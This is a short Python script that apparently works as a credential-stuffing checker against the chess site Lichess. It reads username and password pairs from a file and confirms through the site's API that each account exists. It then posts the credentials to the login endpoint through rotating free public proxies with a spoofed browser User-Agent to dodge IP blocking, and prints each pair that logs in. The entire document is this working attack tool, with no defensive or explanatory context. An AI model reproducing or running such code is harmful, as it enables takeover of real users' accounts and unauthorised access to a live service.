def s2(user, password):
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all")
    proxy_list = r.text.split("\r\n")
    for p in proxy_list:
        proxies = {"http" : "http://" + p, "https" : "http://" + p}
        try:
          n = requests.post("https://lichess.org/login", data = {"username" : user.upper(), "password" : password}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100"}, proxies=proxies, timeout=2)
          return n
        except: time.sleep(0.2)
    return 0

for i in open("list").read().split("\n"):
    user = i.split(" ")[0]
    pwd = i.split(" ")[1]
    if (requests.get("https://lichess.org/api/user/"+user).status_code != 200): continue
    if (s2(user, pwd).status_code == 200): print(user, pwd)